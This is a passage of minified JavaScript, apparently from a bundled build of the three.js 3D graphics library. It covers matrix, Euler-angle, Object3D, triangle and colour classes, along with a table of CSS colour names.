this.set(n,0,i,0,0,1,0,0,-i,0,n,0,0,0,0,1),this}makeRotationZ(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,-i,0,0,i,n,0,0,0,0,1,0,0,0,0,1),this}makeRotationAxis(e,n){const i=Math.cos(n),s=Math.sin(n),r=1-i,a=e.x,o=e.y,l=e.z,c=r*a,h=r*o;return this.set(c*a+i,c*o-s*l,c*l+s*o,0,c*o+s*l,h*o+i,h*l-s*a,0,c*l-s*o,h*l+s*a,r*l*l+i,0,0,0,0,1),this}makeScale(e,n,i){return this.set(e,0,0,0,0,n,0,0,0,0,i,0,0,0,0,1),this}makeShear(e,n,i,s,r,a){return this.set(1,i,r,0,e,1,a,0,n,s,1,0,0,0,0,1),this}compose(e,n,i){const s=this.elements,r=n._x,a=n._y,o=n._z,l=n._w,c=r+r,h=a+a,d=o+o,p=r*c,f=r*h,y=r*d,_=a*h,g=a*d,u=o*d,v=l*c,x=l*h,S=l*d,E=i.x,A=i.y,C=i.z;return s[0]=(1-(_+u))*E,s[1]=(f+S)*E,s[2]=(y-x)*E,s[3]=0,s[4]=(f-S)*A,s[5]=(1-(p+u))*A,s[6]=(g+v)*A,s[7]=0,s[8]=(y+x)*C,s[9]=(g-v)*C,s[10]=(1-(p+_))*C,s[11]=0,s[12]=e.x,s[13]=e.y,s[14]=e.z,s[15]=1,this}decompose(e,n,i){const s=this.elements;if(e.x=s[12],e.y=s[13],e.z=s[14],this.determinant()===0)return i.set(1,1,1),n.identity(),this;let r=Js.set(s[0],s[1],s[2]).length();const a=Js.set(s[4],s[5],s[6]).length(),o=Js.set(s[8],s[9],s[10]).length();this.determinant()<0&&(r=-r),Bn.copy(this);const c=1/r,h=1/a,d=1/o;return Bn.elements[0]*=c,Bn.elements[1]*=c,Bn.elements[2]*=c,Bn.elements[4]*=h,Bn.elements[5]*=h,Bn.elements[6]*=h,Bn.elements[8]*=d,Bn.elements[9]*=d,Bn.elements[10]*=d,n.setFromRotationMatrix(Bn),i.x=r,i.y=a,i.z=o,this}makePerspective(e,n,i,s,r,a,o=ri,l=!1){const c=this.elements,h=2*r/(n-e),d=2*r/(i-s),p=(n+e)/(n-e),f=(i+s)/(i-s);let y,_;if(l)y=r/(a-r),_=a*r/(a-r);else if(o===ri)y=-(a+r)/(a-r),_=-2*a*r/(a-r);else if(o===zl)y=-a/(a-r),_=-a*r/(a-r);else throw new Error("THREE.Matrix4.makePerspective(): Invalid coordinate system: "+o);return c[0]=h,c[4]=0,c[8]=p,c[12]=0,c[1]=0,c[5]=d,c[9]=f,c[13]=0,c[2]=0,c[6]=0,c[10]=y,c[14]=_,c[3]=0,c[7]=0,c[11]=-1,c[15]=0,this}makeOrthographic(e,n,i,s,r,a,o=ri,l=!1){const c=this.elements,h=2/(n-e),d=2/(i-s),p=-(n+e)/(n-e),f=-(i+s)/(i-s);let y,_;if(l)y=1/(a-r),_=a/(a-r);else if(o===ri)y=-2/(a-r),_=-(a+r)/(a-r);else if(o===zl)y=-1/(a-r),_=-r/(a-r);else throw new Error("THREE.Matrix4.makeOrthographic(): Invalid coordinate system: "+o);return c[0]=h,c[4]=0,c[8]=0,c[12]=p,c[1]=0,c[5]=d,c[9]=0,c[13]=f,c[2]=0,c[6]=0,c[10]=y,c[14]=_,c[3]=0,c[7]=0,c[11]=0,c[15]=1,this}equals(e){const n=this.elements,i=e.elements;for(let s=0;s<16;s++)if(n[s]!==i[s])return!1;return!0}fromArray(e,n=0){for(let i=0;i<16;i++)this.elements[i]=e[i+n];return this}toArray(e=[],n=0){const i=this.elements;return e[n]=i[0],e[n+1]=i[1],e[n+2]=i[2],e[n+3]=i[3],e[n+4]=i[4],e[n+5]=i[5],e[n+6]=i[6],e[n+7]=i[7],e[n+8]=i[8],e[n+9]=i[9],e[n+10]=i[10],e[n+11]=i[11],e[n+12]=i[12],e[n+13]=i[13],e[n+14]=i[14],e[n+15]=i[15],e}}const Js=new G,Bn=new St,Kw=new G(0,0,0),Zw=new G(1,1,1),Vi=new G,Uo=new G,gn=new G,bm=new St,Sm=new so;class hi{constructor(e=0,n=0,i=0,s=hi.DEFAULT_ORDER){this.isEuler=!0,this._x=e,this._y=n,this._z=i,this._order=s}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get order(){return this._order}set order(e){this._order=e,this._onChangeCallback()}set(e,n,i,s=this._order){return this._x=e,this._y=n,this._z=i,this._order=s,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._order)}copy(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this}setFromRotationMatrix(e,n=this._order,i=!0){const s=e.elements,r=s[0],a=s[4],o=s[8],l=s[1],c=s[5],h=s[9],d=s[2],p=s[6],f=s[10];switch(n){case"XYZ":this._y=Math.asin(Ge(o,-1,1)),Math.abs(o)<.9999999?(this._x=Math.atan2(-h,f),this._z=Math.atan2(-a,r)):(this._x=Math.atan2(p,c),this._z=0);break;case"YXZ":this._x=Math.asin(-Ge(h,-1,1)),Math.abs(h)<.9999999?(this._y=Math.atan2(o,f),this._z=Math.atan2(l,c)):(this._y=Math.atan2(-d,r),this._z=0);break;case"ZXY":this._x=Math.asin(Ge(p,-1,1)),Math.abs(p)<.9999999?(this._y=Math.atan2(-d,f),this._z=Math.atan2(-a,c)):(this._y=0,this._z=Math.atan2(l,r));break;case"ZYX":this._y=Math.asin(-Ge(d,-1,1)),Math.abs(d)<.9999999?(this._x=Math.atan2(p,f),this._z=Math.atan2(l,r)):(this._x=0,this._z=Math.atan2(-a,c));break;case"YZX":this._z=Math.asin(Ge(l,-1,1)),Math.abs(l)<.9999999?(this._x=Math.atan2(-h,c),this._y=Math.atan2(-d,r)):(this._x=0,this._y=Math.atan2(o,f));break;case"XZY":this._z=Math.asin(-Ge(a,-1,1)),Math.abs(a)<.9999999?(this._x=Math.atan2(p,c),this._y=Math.atan2(o,r)):(this._x=Math.atan2(-h,f),this._y=0);break;default:Ie("Euler: .setFromRotationMatrix() encountered an unknown order: "+n)}return this._order=n,i===!0&&this._onChangeCallback(),this}setFromQuaternion(e,n,i){return bm.makeRotationFromQuaternion(e),this.setFromRotationMatrix(bm,n,i)}setFromVector3(e,n=this._order){return this.set(e.x,e.y,e.z,n)}reorder(e){return Sm.setFromEuler(this),this.setFromQuaternion(Sm,e)}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order}fromArray(e){return this._x=e[0],this._y=e[1],this._z=e[2],e[3]!==void 0&&(this._order=e[3]),this._onChangeCallback(),this}toArray(e=[],n=0){return e[n]=this._x,e[n+1]=this._y,e[n+2]=this._z,e[n+3]=this._order,e}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._order}}hi.DEFAULT_ORDER="XYZ";class ry{constructor(){this.mask=1}set(e){this.mask=(1<<e|0)>>>0}enable(e){this.mask|=1<<e|0}enableAll(){this.mask=-1}toggle(e){this.mask^=1<<e|0}disable(e){this.mask&=~(1<<e|0)}disableAll(){this.mask=0}test(e){return(this.mask&e.mask)!==0}isEnabled(e){return(this.mask&(1<<e|0))!==0}}let Jw=0;const wm=new G,Qs=new so,vi=new St,Oo=new G,ra=new G,Qw=new G,eM=new so,Mm=new G(1,0,0),Em=new G(0,1,0),Tm=new G(0,0,1),Am={type:"added"},tM={type:"removed"},er={type:"childadded",child:null},ru={type:"childremoved",child:null};class $t extends Wr{constructor(){super(),this.isObject3D=!0,Object.defineProperty(this,"id",{value:Jw++}),this.uuid=io(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=$t.DEFAULT_UP.clone();const e=new G,n=new hi,i=new so,s=new G(1,1,1);function r(){i.setFromEuler(n,!1)}function a(){n.setFromQuaternion(i,void 0,!1)}n._onChange(r),i._onChange(a),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:e},rotation:{configurable:!0,enumerable:!0,value:n},quaternion:{configurable:!0,enumerable:!0,value:i},scale:{configurable:!0,enumerable:!0,value:s},modelViewMatrix:{value:new St},normalMatrix:{value:new Ue}}),this.matrix=new St,this.matrixWorld=new St,this.matrixAutoUpdate=$t.DEFAULT_MATRIX_AUTO_UPDATE,this.matrixWorldAutoUpdate=$t.DEFAULT_MATRIX_WORLD_AUTO_UPDATE,this.matrixWorldNeedsUpdate=!1,this.layers=new ry,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.animations=[],this.customDepthMaterial=void 0,this.customDistanceMaterial=void 0,this.userData={}}onBeforeShadow(){}onAfterShadow(){}onBeforeRender(){}onAfterRender(){}applyMatrix4(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)}applyQuaternion(e){return this.quaternion.premultiply(e),this}setRotationFromAxisAngle(e,n){this.quaternion.setFromAxisAngle(e,n)}setRotationFromEuler(e){this.quaternion.setFromEuler(e,!0)}setRotationFromMatrix(e){this.quaternion.setFromRotationMatrix(e)}setRotationFromQuaternion(e){this.quaternion.copy(e)}rotateOnAxis(e,n){return Qs.setFromAxisAngle(e,n),this.quaternion.multiply(Qs),this}rotateOnWorldAxis(e,n){return Qs.setFromAxisAngle(e,n),this.quaternion.premultiply(Qs),this}rotateX(e){return this.rotateOnAxis(Mm,e)}rotateY(e){return this.rotateOnAxis(Em,e)}rotateZ(e){return this.rotateOnAxis(Tm,e)}translateOnAxis(e,n){return wm.copy(e).applyQuaternion(this.quaternion),this.position.add(wm.multiplyScalar(n)),this}translateX(e){return this.translateOnAxis(Mm,e)}translateY(e){return this.translateOnAxis(Em,e)}translateZ(e){return this.translateOnAxis(Tm,e)}localToWorld(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(this.matrixWorld)}worldToLocal(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(vi.copy(this.matrixWorld).invert())}lookAt(e,n,i){e.isVector3?Oo.copy(e):Oo.set(e,n,i);const s=this.parent;this.updateWorldMatrix(!0,!1),ra.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?vi.lookAt(ra,Oo,this.up):vi.lookAt(Oo,ra,this.up),this.quaternion.setFromRotationMatrix(vi),s&&(vi.extractRotation(s.matrixWorld),Qs.setFromRotationMatrix(vi),this.quaternion.premultiply(Qs.invert()))}add(e){if(arguments.length>1){for(let n=0;n<arguments.length;n++)this.add(arguments[n]);return this}return e===this?(Ze("Object3D.add: object can't be added as a child of itself.",e),this):(e&&e.isObject3D?(e.removeFromParent(),e.parent=this,this.children.push(e),e.dispatchEvent(Am),er.child=e,this.dispatchEvent(er),er.child=null):Ze("Object3D.add: object not an instance of THREE.Object3D.",e),this)}remove(e){if(arguments.length>1){for(let i=0;i<arguments.length;i++)this.remove(arguments[i]);return this}const n=this.children.indexOf(e);return n!==-1&&(e.parent=null,this.children.splice(n,1),e.dispatchEvent(tM),ru.child=e,this.dispatchEvent(ru),ru.child=null),this}removeFromParent(){const e=this.parent;return e!==null&&e.remove(this),this}clear(){return this.remove(...this.children)}attach(e){return this.updateWorldMatrix(!0,!1),vi.copy(this.matrixWorld).invert(),e.parent!==null&&(e.parent.updateWorldMatrix(!0,!1),vi.multiply(e.parent.matrixWorld)),e.applyMatrix4(vi),e.removeFromParent(),e.parent=this,this.children.push(e),e.updateWorldMatrix(!1,!0),e.dispatchEvent(Am),er.child=e,this.dispatchEvent(er),er.child=null,this}getObjectById(e){return this.getObjectByProperty("id",e)}getObjectByName(e){return this.getObjectByProperty("name",e)}getObjectByProperty(e,n){if(this[e]===n)return this;for(let i=0,s=this.children.length;i<s;i++){const a=this.children[i].getObjectByProperty(e,n);if(a!==void 0)return a}}getObjectsByProperty(e,n,i=[]){this[e]===n&&i.push(this);const s=this.children;for(let r=0,a=s.length;r<a;r++)s[r].getObjectsByProperty(e,n,i);return i}getWorldPosition(e){return this.updateWorldMatrix(!0,!1),e.setFromMatrixPosition(this.matrixWorld)}getWorldQuaternion(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ra,e,Qw),e}getWorldScale(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ra,eM,e),e}getWorldDirection(e){this.updateWorldMatrix(!0,!1);const n=this.matrixWorld.elements;return e.set(n[8],n[9],n[10]).normalize()}raycast(){}traverse(e){e(this);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].traverse(e)}traverseVisible(e){if(this.visible===!1)return;e(this);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].traverseVisible(e)}traverseAncestors(e){const n=this.parent;n!==null&&(e(n),n.traverseAncestors(e))}updateMatrix(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0}updateMatrixWorld(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),this.matrixWorldNeedsUpdate=!1,e=!0);const n=this.children;for(let i=0,s=n.length;i<s;i++)n[i].updateMatrixWorld(e)}updateWorldMatrix(e,n){const i=this.parent;if(e===!0&&i!==null&&i.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),n===!0){const s=this.children;for(let r=0,a=s.length;r<a;r++)s[r].updateWorldMatrix(!1,!0)}}toJSON(e){const n=e===void 0||typeof e=="string",i={};n&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{},skeletons:{},animations:{},nodes:{}},i.metadata={version:4.7,type:"Object",generator:"Object3D.toJSON"});const s={};s.uuid=this.uuid,s.type=this.type,this.name!==""&&(s.name=this.name),this.castShadow===!0&&(s.castShadow=!0),this.receiveShadow===!0&&(s.receiveShadow=!0),this.visible===!1&&(s.visible=!1),this.frustumCulled===!1&&(s.frustumCulled=!1),this.renderOrder!==0&&(s.renderOrder=this.renderOrder),Object.keys(this.userData).length>0&&(s.userData=this.userData),s.layers=this.layers.mask,s.matrix=this.matrix.toArray(),s.up=this.up.toArray(),this.matrixAutoUpdate===!1&&(s.matrixAutoUpdate=!1),this.isInstancedMesh&&(s.type="InstancedMesh",s.count=this.count,s.instanceMatrix=this.instanceMatrix.toJSON(),this.instanceColor!==null&&(s.instanceColor=this.instanceColor.toJSON())),this.isBatchedMesh&&(s.type="BatchedMesh",s.perObjectFrustumCulled=this.perObjectFrustumCulled,s.sortObjects=this.sortObjects,s.drawRanges=this._drawRanges,s.reservedRanges=this._reservedRanges,s.geometryInfo=this._geometryInfo.map(o=>({...o,boundingBox:o.boundingBox?o.boundingBox.toJSON():void 0,boundingSphere:o.boundingSphere?o.boundingSphere.toJSON():void 0})),s.instanceInfo=this._instanceInfo.map(o=>({...o})),s.availableInstanceIds=this._availableInstanceIds.slice(),s.availableGeometryIds=this._availableGeometryIds.slice(),s.nextIndexStart=this._nextIndexStart,s.nextVertexStart=this._nextVertexStart,s.geometryCount=this._geometryCount,s.maxInstanceCount=this._maxInstanceCount,s.maxVertexCount=this._maxVertexCount,s.maxIndexCount=this._maxIndexCount,s.geometryInitialized=this._geometryInitialized,s.matricesTexture=this._matricesTexture.toJSON(e),s.indirectTexture=this._indirectTexture.toJSON(e),this._colorsTexture!==null&&(s.colorsTexture=this._colorsTexture.toJSON(e)),this.boundingSphere!==null&&(s.boundingSphere=this.boundingSphere.toJSON()),this.boundingBox!==null&&(s.boundingBox=this.boundingBox.toJSON()));function r(o,l){return o[l.uuid]===void 0&&(o[l.uuid]=l.toJSON(e)),l.uuid}if(this.isScene)this.background&&(this.background.isColor?s.background=this.background.toJSON():this.background.isTexture&&(s.background=this.background.toJSON(e).uuid)),this.environment&&this.environment.isTexture&&this.environment.isRenderTargetTexture!==!0&&(s.environment=this.environment.toJSON(e).uuid);else if(this.isMesh||this.isLine||this.isPoints){s.geometry=r(e.geometries,this.geometry);const o=this.geometry.parameters;if(o!==void 0&&o.shapes!==void 0){const l=o.shapes;if(Array.isArray(l))for(let c=0,h=l.length;c<h;c++){const d=l[c];r(e.shapes,d)}else r(e.shapes,l)}}if(this.isSkinnedMesh&&(s.bindMode=this.bindMode,s.bindMatrix=this.bindMatrix.toArray(),this.skeleton!==void 0&&(r(e.skeletons,this.skeleton),s.skeleton=this.skeleton.uuid)),this.material!==void 0)if(Array.isArray(this.material)){const o=[];for(let l=0,c=this.material.length;l<c;l++)o.push(r(e.materials,this.material[l]));s.material=o}else s.material=r(e.materials,this.material);if(this.children.length>0){s.children=[];for(let o=0;o<this.children.length;o++)s.children.push(this.children[o].toJSON(e).object)}if(this.animations.length>0){s.animations=[];for(let o=0;o<this.animations.length;o++){const l=this.animations[o];s.animations.push(r(e.animations,l))}}if(n){const o=a(e.geometries),l=a(e.materials),c=a(e.textures),h=a(e.images),d=a(e.shapes),p=a(e.skeletons),f=a(e.animations),y=a(e.nodes);o.length>0&&(i.geometries=o),l.length>0&&(i.materials=l),c.length>0&&(i.textures=c),h.length>0&&(i.images=h),d.length>0&&(i.shapes=d),p.length>0&&(i.skeletons=p),f.length>0&&(i.animations=f),y.length>0&&(i.nodes=y)}return i.object=s,i;function a(o){const l=[];for(const c in o){const h=o[c];delete h.metadata,l.push(h)}return l}}clone(e){return new this.constructor().copy(this,e)}copy(e,n=!0){if(this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.rotation.order=e.rotation.order,this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldAutoUpdate=e.matrixWorldAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.animations=e.animations.slice(),this.userData=JSON.parse(JSON.stringify(e.userData)),n===!0)for(let i=0;i<e.children.length;i++){const s=e.children[i];this.add(s.clone())}return this}}$t.DEFAULT_UP=new G(0,1,0);$t.DEFAULT_MATRIX_AUTO_UPDATE=!0;$t.DEFAULT_MATRIX_WORLD_AUTO_UPDATE=!0;const zn=new G,yi=new G,au=new G,xi=new G,tr=new G,nr=new G,Cm=new G,ou=new G,lu=new G,cu=new G,uu=new bt,du=new bt,hu=new bt;class jn{constructor(e=new G,n=new G,i=new G){this.a=e,this.b=n,this.c=i}static getNormal(e,n,i,s){s.subVectors(i,n),zn.subVectors(e,n),s.cross(zn);const r=s.lengthSq();return r>0?s.multiplyScalar(1/Math.sqrt(r)):s.set(0,0,0)}static getBarycoord(e,n,i,s,r){zn.subVectors(s,n),yi.subVectors(i,n),au.subVectors(e,n);const a=zn.dot(zn),o=zn.dot(yi),l=zn.dot(au),c=yi.dot(yi),h=yi.dot(au),d=a*c-o*o;if(d===0)return r.set(0,0,0),null;const p=1/d,f=(c*l-o*h)*p,y=(a*h-o*l)*p;return r.set(1-f-y,y,f)}static containsPoint(e,n,i,s){return this.getBarycoord(e,n,i,s,xi)===null?!1:xi.x>=0&&xi.y>=0&&xi.x+xi.y<=1}static getInterpolation(e,n,i,s,r,a,o,l){return this.getBarycoord(e,n,i,s,xi)===null?(l.x=0,l.y=0,"z"in l&&(l.z=0),"w"in l&&(l.w=0),null):(l.setScalar(0),l.addScaledVector(r,xi.x),l.addScaledVector(a,xi.y),l.addScaledVector(o,xi.z),l)}static getInterpolatedAttribute(e,n,i,s,r,a){return uu.setScalar(0),du.setScalar(0),hu.setScalar(0),uu.fromBufferAttribute(e,n),du.fromBufferAttribute(e,i),hu.fromBufferAttribute(e,s),a.setScalar(0),a.addScaledVector(uu,r.x),a.addScaledVector(du,r.y),a.addScaledVector(hu,r.z),a}static isFrontFacing(e,n,i,s){return zn.subVectors(i,n),yi.subVectors(e,n),zn.cross(yi).dot(s)<0}set(e,n,i){return this.a.copy(e),this.b.copy(n),this.c.copy(i),this}setFromPointsAndIndices(e,n,i,s){return this.a.copy(e[n]),this.b.copy(e[i]),this.c.copy(e[s]),this}setFromAttributeAndIndices(e,n,i,s){return this.a.fromBufferAttribute(e,n),this.b.fromBufferAttribute(e,i),this.c.fromBufferAttribute(e,s),this}clone(){return new this.constructor().copy(this)}copy(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this}getArea(){return zn.subVectors(this.c,this.b),yi.subVectors(this.a,this.b),zn.cross(yi).length()*.5}getMidpoint(e){return e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)}getNormal(e){return jn.getNormal(this.a,this.b,this.c,e)}getPlane(e){return e.setFromCoplanarPoints(this.a,this.b,this.c)}getBarycoord(e,n){return jn.getBarycoord(e,this.a,this.b,this.c,n)}getInterpolation(e,n,i,s,r){return jn.getInterpolation(e,this.a,this.b,this.c,n,i,s,r)}containsPoint(e){return jn.containsPoint(e,this.a,this.b,this.c)}isFrontFacing(e){return jn.isFrontFacing(this.a,this.b,this.c,e)}intersectsBox(e){return e.intersectsTriangle(this)}closestPointToPoint(e,n){const i=this.a,s=this.b,r=this.c;let a,o;tr.subVectors(s,i),nr.subVectors(r,i),ou.subVectors(e,i);const l=tr.dot(ou),c=nr.dot(ou);if(l<=0&&c<=0)return n.copy(i);lu.subVectors(e,s);const h=tr.dot(lu),d=nr.dot(lu);if(h>=0&&d<=h)return n.copy(s);const p=l*d-h*c;if(p<=0&&l>=0&&h<=0)return a=l/(l-h),n.copy(i).addScaledVector(tr,a);cu.subVectors(e,r);const f=tr.dot(cu),y=nr.dot(cu);if(y>=0&&f<=y)return n.copy(r);const _=f*c-l*y;if(_<=0&&c>=0&&y<=0)return o=c/(c-y),n.copy(i).addScaledVector(nr,o);const g=h*y-f*d;if(g<=0&&d-h>=0&&f-y>=0)return Cm.subVectors(r,s),o=(d-h)/(d-h+(f-y)),n.copy(s).addScaledVector(Cm,o);const u=1/(g+_+p);return a=_*u,o=p*u,n.copy(i).addScaledVector(tr,a).addScaledVector(nr,o)}equals(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)}}const ay={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},Hi={h:0,s:0,l:0},Fo={h:0,s:0,l:0};function pu(t,e,n){return n<0&&(n+=1),n>1&&(n-=1),n<1/6?t+(e-t)*6*n:n<1/2?e:n<2/3?t+(e-t)*6*(2/3-n):t}class Xe{constructor(e,n,i){return this.isColor=!0,this.r=1,this.g=1,this.b=1,this.set(e,n,i)}set(e,n,i){if(n===void 0&&i===void 0){const s=e;s&&s.isColor?this.copy(s):typeof s=="number"?this.setHex(s):typeof s=="string"&&this.setStyle(s)}else this.setRGB(e,n,i);return this}setScalar(e){return this.r=e,this.g=e,this.b=e,this}setHex(e,n=Rn){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(e&255)/255,je.colorSpaceToWorking(this,n),this}setRGB(e,n,i,s=je.workingColorSpace){return this.r=e,this.g=n,this.b=i,je.colorSpaceToWorking(this,s),this}setHSL(e,n,i,s=je.workingColorSpace){if(e=Vw(e,1),n=Ge(n,0,1),i=Ge(i,0,1),n===0)this.r=this.g=this.b=i;else{const r=i<=.5?i*(1+n):i+n-i*n,a=2*i-r;this.r=pu(a,r,e+1/3),this.g=pu(a,r,e),this.b=pu(a,r,e-1/3)}return je.colorSpaceToWorking(this,s),this}setStyle(e,n=Rn){function i(r){r!==void 0&&parseFloat(r)<1&&Ie("Color: Alpha component of "+e+" will be ignored.")}let s;if(s=/^(\w+)\(([^\)]*)\)/.exec(e)){let r;const a=s[1],o=s[2];switch(a){case"rgb":case"rgba":if(r=/^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setRGB(Math.min(255,parseInt(r[1],10))/255,Math.min(255,parseInt(r[2],10))/255,Math.min(255,parseInt(r[3],10))/255,n);if(r=/^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setRGB(Math.min(100,parseInt(r[1],10))/100,Math.min(100,parseInt(r[2],10))/100,Math.min(100,parseInt(r[3],10))/100,n);break;case"hsl":case"hsla":if(r=/^\s*(\d*\.?\d+)\s*,\s*(\d*\.?\d+)\%\s*,\s*(\d*\.?\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setHSL(parseFloat(r[1])/360,parseFloat(r[2])/100,parseFloat(r[3])/100,n);break;default:Ie("Color: Unknown color model "+e)}}else if(s=/^\#([A-Fa-f\d]+)$/.exec(e)){const r=s[1],a=r.length;if(a===3)return this.setRGB(parseInt(r.charAt(0),16)/15,parseInt(r.charAt(1),16)/15,parseInt(r.charAt(2),16)/15,n);if(a===6)return this.setHex(parseInt(r,16),n);Ie("Color: Invalid hex color "+e)}else if(e&&e.length>0)return this.setColorName(e,n);return this}setColorName(e,n=Rn){const i=ay[e.toLowerCase()];return i!==void 0?this.setHex(i,n):Ie("Color: Unknown color "+e),this}clone(){return new this.constructor(this.r,this.g,this.b)}copy(e){return this.r=e.r,this.g=e.g,this.b=e.b,this}copySRGBToLinear(e){return this.r=Ri(e.r),this.g=Ri(e.g),this.b=Ri(e.b),this}copyLinearToSRGB(e){return this.r=Ar(e.r),this.g=Ar(e.g),this.b=Ar(e.b),this}convertSRGBToLinear(){return this.copySRGBToLinear(this),this}convertLinearToSRGB(){return this.copyLinearToSRGB(this),this}getHex(e=Rn){return je.workingToColorSpace(jt.copy(this),e),Math.round(Ge(jt.r*255,0,255))*65536+Math.round(Ge(jt.g*255,0,255))*256+Math.round(Ge(jt.b*255,0,255))}getHexString(e=Rn){return("000000"+this.getHex(e).toString(16)).slice(-6)}getHSL(e,n=je.workingColorSpace){je.workingToColorSpace(jt.copy(this),n);const i=jt.r,s=jt.g,r=jt.b,a=Math.max(i,s,r),o=Math.min(i,s,r);let l,c;const h=(o+a)/2;if(o===a)l=0,c=0;else{const d=a-o;switch(c=h<=.5?d/(a+o):d/(2-a-o),a){case i:l=(s-r)/d+(s<r?6:0);break;case s:l=(r-i)/d+2;break;case r:l=(i-s)/d+4;break}l/=6}return e.h=l,e.s=c,e.l=h,e}getRGB(e,n=je.workingColorSpace){return je.workingToColorSpace(jt.copy(this),n),e.r=jt.r,e.g=jt.g,e.b=jt.b,e}getStyle(e=Rn){je.workingToColorSpace(jt.copy(this),e);const n=jt.r,i=jt.g,s=jt.b;return e!==Rn?`color(${e} ${n.toFixed(3)} ${i.toFixed(3)} 